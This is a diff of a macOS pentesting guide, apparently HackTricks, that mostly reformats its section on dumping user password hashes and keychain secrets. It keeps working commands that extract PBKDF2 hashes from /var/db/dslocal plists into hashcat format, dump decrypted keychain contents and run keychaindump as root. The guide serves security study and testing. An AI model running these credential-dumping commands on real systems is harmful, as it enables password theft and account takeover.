@@ -19,23 +19,27 @@
 Shadow password is stored with the user's configuration in plists located in **`/var/db/dslocal/nodes/Default/users/`**.\
 The following oneliner can be use to dump **all the information about the users** (including hash info):
 
-```
+{% code overflow="wrap" %}
+```bash
 for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
 ```
+{% endcode %}
 
 [**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) can be used to transform the hash to **hashcat** **format**.
 
 An alternative one-liner which will dump creds of all non-service accounts in hashcat format `-m 7100` (macOS PBKDF2-SHA512):
 
-```
+{% code overflow="wrap" %}
+```bash
 sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
 ```
+{% endcode %}
 
 ### Keychain Dump
 
 Note that when using the security binary to **dump the passwords decrypted**, several prompts will ask the user to allow this operation.
 
-```
+```bash
 #security
 secuirty dump-trust-settings [-s] [-d] #List certificates
 security list-keychains #List keychain dbs
@@ -45,6 +49,10 @@ security dump-keychain -d #Dump all the info, included secrets (the user will be
 ```
 
 ### [Keychaindump](https://github.com/juuso/keychaindump)
+
+{% hint style="danger" %}
+Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) it looks like these tools aren't working anymore in Big Sur.
+{% endhint %}
 
 The attacker still needs to gain access to the system as well as escalate to **root** privileges in order to run **keychaindump**. This approach comes with its own conditions. As mentioned earlier, **upon login your keychain is unlocked by default** and remains unlocked while you use your system. This is for convenience so that the user doesn’t need to enter their password every time an application wishes to access the keychain. If the user has changed this setting and chosen to lock the keychain after every use, keychaindump will no longer work; it relies on an unlocked keychain to function.
 
@@ -59,10 +67,6 @@ sudo vmmap <securityd PID> | grep MALLOC_TINY
 ```bash
 sudo ./keychaindump
 ```
-
-{% hint style="danger" %}
-Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) it looks like these tools aren't working anymore in Big Sur.
-{% endhint %}
 
 ### chainbreaker
 
